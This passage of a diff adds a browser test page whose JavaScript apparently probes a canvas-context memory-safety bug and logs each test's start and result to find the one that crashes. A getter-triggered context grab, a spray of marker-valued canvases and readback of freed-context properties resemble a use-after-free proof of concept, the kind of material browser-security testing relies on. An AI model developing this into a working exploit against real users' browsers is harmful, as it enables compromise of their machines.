+      for (var i = 0; i < 8; i++) ctx.save();
+      ctx.lineWidth = 1.0;
+      return true;
+    }
+  });
+
+  var bmpCtx = null;
+  try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (e) {}
+  if (!savedCtx || !bmpCtx) return 'trigger-fail inner=' + !!savedCtx + ' bmr=' + !!bmpCtx;
+
+  var keep = [];
+  for (var k = 0; k < 16; k++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var cx = null;
+    try { cx = c.getContext('2d'); } catch (e) {}
+    if (cx) {
+      cx.lineWidth = 4.5678;
+      cx.miterLimit = 8.88;
+      cx.globalAlpha = 0.33;
+      cx.lineDashOffset = 6.66;
+      cx.shadowBlur = 9.99;
+      keep.push(c);
+    }
+  }
+  canvas._keep = keep;
+
+  var names = ['lw', 'ml', 'ga', 'ldo', 'sb'], vals = [];
+  for (var q = 0; q < names.length; q++) {
+    var v = 'E';
+    try { v = savedCtx[['lineWidth', 'miterLimit', 'globalAlpha', 'lineDashOffset', 'shadowBlur'][q]]; }
+    catch (e) { v = 'E:' + e.name; }
+    vals.push(names[q] + '=' + fmt(v));
+  }
+  return 'made=' + keep.length + ' ' + vals.join(' ');
+}, 15000);
+
+/* =========================================================
+ * runner
+ * =======================================================*/
+var results = { ok: 0, err: 0, total: TESTS.length };
+
+function row(id, name) {
+  var tr = document.createElement('tr');
+  var a = document.createElement('td'); a.className = 'id'; a.textContent = id;
+  var b = document.createElement('td'); b.textContent = name;
+  var c = document.createElement('td'); c.className = 'res run'; c.textContent = 'pending';
+  tr.appendChild(a); tr.appendChild(b); tr.appendChild(c);
+  TBL.appendChild(tr);
+  return c;
+}
+
+function run() {
+  bks('BOOT', 'v2000-all-in-one,tests=' + TESTS.length);
+  var cells = [];
+  for (var i = 0; i < TESTS.length; i++) cells.push(row(TESTS[i].id, TESTS[i].name));
+
+  var idx = 0;
+  function next() {
+    if (idx >= TESTS.length) {
+      bks('DONE', 'ok=' + results.ok + ',err=' + results.err + ',total=' + results.total);
+      BAR.textContent = 'DONE: ' + results.ok + ' ok, ' + results.err + ' err, ' + results.total + ' total';
+      say('DONE. If the page crashed earlier, the last START without a result is the culprit.');
+      return;
+    }
+    var t = TESTS[idx], cell = cells[idx];
+    bks('START', t.id);
+    BAR.textContent = 'running ' + (idx + 1) + '/' + TESTS.length + ': ' + t.id + ' - ' + t.name;
+    cell.textContent = 'running...';
+    cell.className = 'res run';
+
+    var started = Date.now();
+    var p;
+    try { p = Promise.resolve(t.fn()); }
+    catch (e) { p = Promise.reject(e); }
+
+    withTimeout(p, t.budget, t.id).then(function (v) {
+      var ms = Date.now() - started;
+      results.ok++;
+      cell.textContent = fmt(v) + ' (' + ms + 'ms)';
+      cell.className = 'res ok';
+      bks('OK', t.id + ',' + ms + 'ms,' + fmt(v));
+    }, function (e) {
+      var ms = Date.now() - started;
+      results.err++;
+      var msg = (e && e.name ? e.name : 'E') + ':' + (e && e.message ? e.message : '');
+      cell.textContent = msg + ' (' + ms + 'ms)';
+      cell.className = 'res err';
+      bks('ERR', t.id + ',' + ms + 'ms,' + msg);
+    }).then(function () {
+      idx++;
+      setTimeout(next, 30);
+    });
+  }
+  setTimeout(next, 50);
+}
+
+run();
+</script>
+</body>
+</html>
